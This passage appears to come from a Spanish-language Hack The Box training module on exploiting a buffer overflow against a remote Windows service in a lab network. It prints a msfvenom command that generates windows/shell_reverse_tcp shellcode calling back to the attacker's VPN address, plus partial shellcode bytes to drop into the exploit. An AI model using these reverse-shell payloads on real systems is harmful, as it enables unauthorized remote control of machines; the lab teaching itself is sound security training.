Una vez que hemos creado y probado nuestro exploit, ahora podemos intentar ejecutarlo en un servidor remoto real. Podemos usar el mismo exploit en el objetivo real, y solo necesitamos cambiar el `IP`y `port`en nuestro script para apuntarlo al nuevo objetivo y cambiar el código de shell que usamos dentro del script a algo que nos envíe un shell inverso.
## Shellcode inverso

Primero, necesitamos encontrar la IP de nuestra máquina, a la que debería poder acceder el servidor remoto (en la misma subred de la red):

```shell-session
lilscott6x9@htb[/htb]$ ip -4 a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    ...SNIP...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.15.10/23 brd 10.10.15.255 scope global tun0
```

La IP que usaremos es `tun0`la IP de, ya que nuestra VM está en la misma `10.10.`subred.

Nota: Debe estar conectado a la VPN para poder interactuar con el servidor remoto, así que descargue la clave VPN en caso de que desee ejecutar el exploit desde su propia máquina. La instancia de PwnBox ya está conectada a la VPN, por lo que debería poder conectarse al servidor remoto.

A continuación, generaremos el código de shell que nos enviará un shell inverso, que podemos obtener con la `windows/shell_reverse_tcp`carga útil en `msfvenom`, de la siguiente manera:

```shell-session
lilscott6x9@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
...SNIP...
```

Podemos modificar nuestro exploit copiando la salida y usándola en la `exploit()`función de la `buf`variable.
